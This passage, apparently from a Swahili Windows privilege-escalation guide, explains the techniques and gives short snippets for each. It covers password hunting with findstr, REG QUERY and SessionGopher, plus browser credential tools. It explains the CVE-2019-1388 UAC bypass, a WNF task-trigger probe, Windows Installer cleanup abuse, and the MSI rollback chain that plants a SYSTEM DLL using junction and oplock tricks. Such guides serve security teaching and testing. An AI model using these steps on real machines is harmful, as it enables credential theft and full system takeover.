Kwa Firefox, [Mozilla inaandika](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kwamba `key4.db` na `logins.json` za profile ni faili zinazohusiana za key na login zilizosimbwa. Kuwepo kwake ni dalili tu: angalia kama faili zote mbili zinaweza kusomwa, kama kuna entries zilizohifadhiwa, na kama Primary Password inalinda key kabla ya kuhitimisha kuwa credentials zinaweza kutumika. Ikiwa credential iliyopatikana ni ya akaunti ya domain, kagua kando haki halisi za udhibiti wa makundi ya akaunti hiyo na haki za kundi za [kusoma au kudecode password ya LAPS](../active-directory-methodology/laps.md); artifacts za kivinjari pekee hazithibitishi njia ya kupata administrator.

Tools za kutoa passwords kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano baina** ya vipengele vya software vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)** na kila kipengele hutoa utendaji kupitia interface moja au zaidi, zinazotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child **InProcServer32**, ambayo ina **default value** inayoelekeza kwenye **DLL** na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata registry child InProcServer32, ambayo ina default value inayoelekeza kwenye DLL na value...](<../../images/image (729).png>)

Kimsingi, ukiweza **kuandika juu ya DLL yoyote** itakayotekelezwa, unaweza **kuongeza privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama njia ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa Password kwenye faili na registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili kwa jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta kwenye registry majina ya key na nywila**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** Nimeunda plugin hii ili **itekeleze kiotomatiki kila POST module ya metasploit inayotafuta vitambulisho** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **majina ya watumiaji** na **nywila** za zana kadhaa zinazohifadhi data hii katika maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) ikiwa na **ufikiaji kamili**. Process hiyo hiyo **pia huunda process mpya** (`CreateProcess()`) **yenye privileges za chini, lakini hurithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili wa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges za juu iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu ili kupata maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles nyingine zilizo wazi za processes na threads zilizorithiwa zikiwa na viwango tofauti vya ruhusa (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, huruhusu processes kuwasiliana na kuhamisha data.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu hufafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe hiyo inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges za juu** inayowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kutumia utambulisho wa process hiyo inapowasiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio hili, miongozo hii inaweza kusaidia [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo hukuruhusu **kunasa mawasiliano ya named pipe kwa kutumia tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii hukuruhusu kuorodhesha na kuona pipes zote ili kutafuta privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) inapokuwa katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client ya mbali iliyo-authenticate inaweza kutumia vibaya njia ya async event inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** kwenye faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za Telephony admin na kupakia DLL yoyote kama huduma. Mchakato mzima:

- `ClientAttach` ikiwa na `pszDomainUser` iliyowekwa kuwa njia ya faili iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa async event.
- Kila event huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` hadi kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata data kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima ili kurudia uandishi kwa namna inayotabirika.
- Jiongeze kwenye `[TapiAdministrators]` ndani ya `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiwa na njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### Viendelezi vya faili vinavyoweza kutekeleza vitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya protocol handler / ShellExecute kupitia Markdown renderers

Viungo vya Markdown vinavyoweza kubofya na kupelekwa kwa `ShellExecuteExW` vinaweza kuwasha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines ili kupata passwords**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **huweka credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile ya awali, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwenye michakato

## Kutoka kwa Mtumiaji Mwenye Haki Chache hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii huwezesha kuongeza haki za ufikiaji na kukwepa UAC kwa wakati mmoja, kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni lazima kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Integrity Level ya Administrator Medium hadi High / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuweka Junctions za Saraka za Upload ndani ya Root Inayohudumiwa

Programu inaweza kuunda saraka ndogo ya upload inayotabirika, kuandika ndani yake jina la faili lililotolewa na mtumiaji, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye ruhusa ndogo anaweza kuondoa saraka hiyo ndogo na kuibadilisha na NTFS junction kabla ya server kuandika faili, uandishi unaweza kupitia junction hadi saraka inayohudumiwa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web service ikiwa server inaendesha aina hiyo ya faili. Huu ni mpaka wa arbitrary-write unaotegemea programu husika; kuwepo tu kwa saraka ya upload inayoweza kuandikwa au junction iliyopo hakuthibitishi uwezekano huo.

Kagua jinsi njia kamili inavyoundwa na muda wa hatua hizo ndani ya upload handler, haki za mtumiaji zinazotumika za kufuta/kuunda kwenye saraka ndogo, ACLs zinazotumika za eneo lengwa, iwapo writer hufuata reparse points, na iwapo web server huendesha faili katika eneo hilo. Thibitisha utambulisho wa process ya writer na web server kando. Orodha tulivu inaweza kuonyesha ACLs za saraka na metadata ya reparse, lakini haiwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa utekelezaji unafanyika kwa akaunti ya service, kagua **token halisi ya process** kabla ya kuzingatia njia tofauti ya token-privilege.

## Usafishaji wa privileged scheduled task unaochochewa na WNF

Scheduled task inayokataa kuendeshwa kwa mikono bado inaweza kuwa na trigger inayoweza kutumiwa na mtumiaji asiye na ruhusa maalum. Unakagua privileged task, export XML yake na uchunguze **triggers zote** pamoja na task DACL, principal na action. Hasa, `WnfStateChangeTrigger` hutaja hali ya Windows Notification Facility (WNF); ikiwa hali hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha sasisho, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja chini ya utambulisho wake uliosanidiwa, licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, task ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ikakubali sasisho kwenye hali ya WNF `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata wakati Recall ilikuwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kujaribu kama inafikika, tafuta `ZwUpdateWnfStateData` kwenye `ntdll.dll`, tuma sasisho tupu kwa jina la hali lenye baiti nane, kisha linganisha hali ya matokeo na data ya mara ya mwisho ya kuendeshwa ya task au shughuli za Procmon. Probe ifuatayo iliyopunguzwa hutumia mfuatano wa baiti kutoka kwenye mfano wa task ya Recall; badilisha baiti hizo kwa zile zilizohamishwa kwa task inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha usafishaji wa kujirudia kuwa ufutaji wenye marupurupu

Primitive muhimu si kichochezi pekee, bali ni utaratibu wa usafishaji wenye marupurupu unaokubali directory inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia enumerasheni hadi mabadiliko ya mwisho: ugunduzi wa profile/session, watoto waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria thabiti kwamba pathname iliyokaguliwa awali itafuatwa baadaye kwa kujirudia. Ikiwa vizazi vya chini havifunguliwi kwa kutumia directory handles zinazoaminika na kuthibitishwa kabla ya kufutwa, mshambuliaji anaweza kubadilisha namna pathname inavyotatuliwa kati ya enumerasheni na matumizi yake.<sup>[[43]](#references)</sup>

Oanisha kichochezi cha WNF na mbinu ya [kubadilisha oplock, junction na Object Manager symlink](#from-folder-contents-delete-to-system-eop) iliyoelezwa hapa chini: oplock husimamisha cleaner baada ya kuchagua mtoto halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili ufutaji wenye marupurupu unapoendelea tena utatue pathname kupitia `\RPC Control` hadi kwenye lengo lililolindwa. Katika mnyororo wa Recall, hili liliwezesha kufutwa kwa `C:\Config.Msi` na SYSTEM, jambo lililohitajika kwa mbinu ya MSI rollback iliyoelezwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Vizazi vya ndani hupita marekebisho ya juu juu ya reparse point

Kuthibitisha tu root inayodhibitiwa na mshambuliaji na mtoto wake wa moja kwa moja hakulindi ufutaji wa pathname unaojirudia. Acha vitu hivyo vilivyokaguliwa viwe halali, kisha hamishia ubadilishaji wa junction/oplock kwenye mtoto mwingine chini yake; hatimaye `IFileOperation::DeleteItem` hufikia kizazi ambacho hakikuthibitishwa na kufuata lengo lake jipya. CVE-2026-20941 ilitokana hasa na aina hii ya marekebisho yasiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na directory yenye umbo la GUID, lakini ikaacha operesheni ya zamani ya ufutaji unaojirudia.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila kizazi** kwa kutumia directory handle ambayo tayari inaaminika, kupata na kuthibitisha path/object ya mwisho iliyotatuliwa, kisha kutumia deletion disposition kwenye handle hiyo iliyothibitishwa. Usithibitishe prefix kisha urudi kwenye ufutaji unaojirudia unaotumia pathname. Unapokagua patch, kagua pia miundo kwenye sehemu halisi ya wito: katika kisa hiki, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo null na jina linalohusiana `{GUID}\\secure_file.lock`, hivyo kukanusha matokeo ya decompiler yaliyopotosha yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka Kufuta/Kuhamisha/Kubadili Jina kwa Folder Yoyote Hadi SYSTEM EoP

Mbinu iliyoelezwa [**kwenye chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili hutumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali kwa faili hasidi wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka folder ya `C:\Config.Msi`, ambayo Windows Installer itatumia baadaye kuhifadhi faili za rollback wakati wa kuondoa vifurushi vingine vya MSI. Faili za rollback zitakuwa zimebadilishwa ili ziwe na payload hasidi.

### Uingizaji wa njia ya usafishaji ya Windows Installer COM (CVE-2025-27727)

Mteja mwenye marupurupu ya chini anaweza kufikia huduma ya SYSTEM ya `msiexec.exe` kupitia kitu cha COM cha `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibaini kwamba miito husika ya `IMsiServer` ni `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zimepatikana kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji ambaye si msimamizi, `SetEEUIDirectoryAndFilter` hujifanya kuwa caller kwa muda tu inapofungua njia iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kwamba caller anaweza kufuta directory na huzuia kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na usafishaji utakaofanyika baadaye wala kuthibitisha kwamba Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` huratibu njia hiyo kama folder bila kujali argument ya filter ya caller. Huduma huandika thamani ya `REG_DWORD` yenye jina maalum chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni njia inayodhibitiwa na caller, na data `0x00000002` ni alama ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye usafishaji. Worker wake yenye marupurupu yaliyoinuliwa huorodhesha thamani za registry na kupitisha maingizo ya folder kwa `FDeleteFolder` ya kujirudia bila kukagua chanzo cha njia. Uondoaji wa kawaida ukishindwa, code pia huita `LockdownPath`, huondoa sifa za faili, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano mdogo zaidi wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia tena path badala ya kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha uruhusu Windows Installer iunde tena path hiyo hiyo ikiwa na data ya rollback iliyolindwa. Cleanup huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hupita kingo iliyokusudiwa na mitigations za `FILE_FLAG_OPEN_REPARSE_POINT` na redirection-trust kwa sababu hakuna reparse point inayohitajika.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika mnyororo wa rollback ulio hapa chini: hifadhi record tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle iliyopewa `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa mapema inaweza kurejesha DACL ruhusu kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha path hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` isiite `ScheduleFileOrFolderDelete` wakati feature gate mpya imewezeshwa. COM call inaweza bado kurudisha success, lakini haiweki tena path inayodhibitiwa na mshambuliaji katika `TempPackages`. Tumia Windows security updates za Aprili 2025 badala ya kuchukulia return yenye mafanikio ya method kuwa kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikika (`TARGETDIR`).
    - Weka installer kuwa **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (rollback backups).
    - **Kagua open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara wakati `.rbf` imeandikwa.
        - Kisha **husubiri** tukio jingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia isifutwe**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall iweze kumalizika.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa kupitia hijack.

> Kwa wakati huu, **trigger vulnerability ya kufuta arbitrary folder kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zenye Madhara**

- Hatua ya 6: Unda tena `C:\Config.Msi` ikiwa na ACL dhaifu
    - Unda tena folder ya `C:\Config.Msi` wewe mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Variable inayosababisha kushindwa kwa lazima.
    - Usakinishaji huu utatumika ku-trigger **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itokee.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa ishara ya tukio `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACLs **hutekelezwa tu handle inapofunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` kwa **rollback script bandia** inayoiambia Windows:
        - Irudishe faili yako ya `.rbf` (DLL yenye madhara) kwenye **mahali penye privileji** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **payload DLL yenye madhara ya kiwango cha SYSTEM**.

- Hatua ya 12: Trigger Rollback
    - Tuma ishara ya sync ili installer iendelee.
    - **Custom action ya type 19 (`ErrorOut`)** imesanidiwa **kufanya usakinishaji ushindwe kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako yenye madhara.
        - Hunakili DLL yako ya `.rbf` kwenye mahali lengwa.
    - Sasa una **DLL yako yenye madhara kwenye path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code ya SYSTEM
    - Endesha **binary inayoaminika inayoinua privileji kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
    - **Boom**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyoelezwa hapo awali) inadhania unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa vulnerability yako inaruhusu tu **kufuta arbitrary file**?

Unaweza kutumia **NTFS internals**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta **stream ya `::$INDEX_ALLOCATION`** ya folda, NTFS **huondoa folda nzima** kwenye filesystem.

Unaweza kufanya hivi ukitumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako hairuhusu kufuta files/folders kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati mchakato wenye upendeleo unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha process ya SYSTEM (k.m., `SilentCleanup`)
- Process hii hukagua folda (k.m., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Inapofikia `file1.txt`, **oplock huanzishwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huondoa yaliyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock kabla ya wakati.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya folda — ukiifuta, folda inafutika.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

